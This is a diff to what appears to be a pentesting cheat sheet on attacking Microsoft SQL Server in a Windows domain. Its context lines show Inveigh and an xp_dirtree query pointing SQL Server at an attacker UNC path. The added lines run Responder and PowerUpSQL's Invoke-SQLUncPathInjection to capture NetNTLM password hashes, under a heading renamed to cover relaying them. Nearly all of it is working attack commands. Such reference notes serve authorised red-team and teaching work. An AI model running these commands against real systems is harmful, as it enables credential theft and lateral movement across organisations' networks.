@@ -1938,8 +1938,13 @@ Get-SQLInstanceDomain | Get-SQLServerInfo | Select-object Instance, ServiceAccou
 .\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
 EXEC xp_dirtree '\\<IP>\pwn', 1, 1
 ```
+
+```
+sudo responder -I eth0
+Get-SQLInstanceDomain | Invoke-SQLUncPathInjection
+```
  
-#### Capture NetNTLM password hash2
+#### Capture NetNTLM password hash and relay it example
 ```
 import-module .\PowerUpSQL.ps1
 Import-Module \Scripts\3rdparty\Inveigh.ps1
